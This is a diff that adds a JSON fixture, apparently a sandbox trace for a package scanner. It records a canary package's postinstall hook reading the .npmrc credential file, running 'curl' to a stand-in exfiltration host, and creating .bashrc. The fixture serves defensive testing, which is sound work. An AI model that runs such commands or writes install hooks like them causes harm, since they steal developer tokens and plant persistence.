@@ -1,0 +1,98 @@
+{
+  "version": 1,
+  "coverage": {
+    "syscallTracing": true,
+    "runtimeHooks": true,
+    "dependencyInstall": "complete",
+    "stepsSkipped": 0
+  },
+  "steps": [
+    {
+      "step": "lifecycle",
+      "target": "drydock-detonation-canary-thief@1.0.0:postinstall",
+      "exitCode": 0,
+      "timedOut": false,
+      "durationMs": 141
+    },
+    {
+      "step": "require",
+      "target": "drydock-detonation-canary-thief:require",
+      "exitCode": 0,
+      "timedOut": false,
+      "durationMs": 85
+    },
+    {
+      "step": "import",
+      "target": "drydock-detonation-canary-thief:import",
+      "exitCode": 0,
+      "timedOut": false,
+      "durationMs": 90
+    }
+  ],
+  "events": [
+    {
+      "step": "lifecycle",
+      "target": "drydock-detonation-canary-thief@1.0.0:postinstall",
+      "pid": 49,
+      "via": "syscall",
+      "kind": "exec",
+      "path": "/usr/local/bin/node",
+      "argv": ["node", "postinstall.js"]
+    },
+    {
+      "step": "lifecycle",
+      "target": "drydock-detonation-canary-thief@1.0.0:postinstall",
+      "pid": 49,
+      "via": "syscall",
+      "kind": "file",
+      "op": "read",
+      "path": "/home/pkg/.npmrc"
+    },
+    {
+      "step": "lifecycle",
+      "target": "drydock-detonation-canary-thief@1.0.0:postinstall",
+      "pid": 49,
+      "via": "syscall",
+      "kind": "connect",
+      "family": "inet",
+      "address": "192.168.65.7",
+      "port": 53
+    },
+    {
+      "step": "lifecycle",
+      "target": "drydock-detonation-canary-thief@1.0.0:postinstall",
+      "pid": 60,
+      "via": "syscall",
+      "kind": "exec",
+      "path": "/bin/sh",
+      "argv": ["/bin/sh", "-c", "sh -c 'curl -s http://exfil.drydock-test.invalid/x || true'"]
+    },
+    {
+      "step": "lifecycle",
+      "target": "drydock-detonation-canary-thief@1.0.0:postinstall",
+      "pid": 61,
+      "via": "syscall",
+      "kind": "exec",
+      "path": "/usr/bin/sh",
+      "argv": ["sh", "-c", "curl -s http://exfil.drydock-test.invalid/x || true"]
+    },
+    {
+      "step": "lifecycle",
+      "target": "drydock-detonation-canary-thief@1.0.0:postinstall",
+      "pid": 49,
+      "via": "syscall",
+      "kind": "file",
+      "op": "create",
+      "path": "/home/pkg/.bashrc"
+    },
+    {
+      "step": "lifecycle",
+      "target": "drydock-detonation-canary-thief@1.0.0:postinstall",
+      "pid": 49,
+      "via": "runtime-hook",
+      "kind": "dns",
+      "hostname": "exfil.drydock-test.invalid"
+    }
+  ],
+  "truncated": false
+}
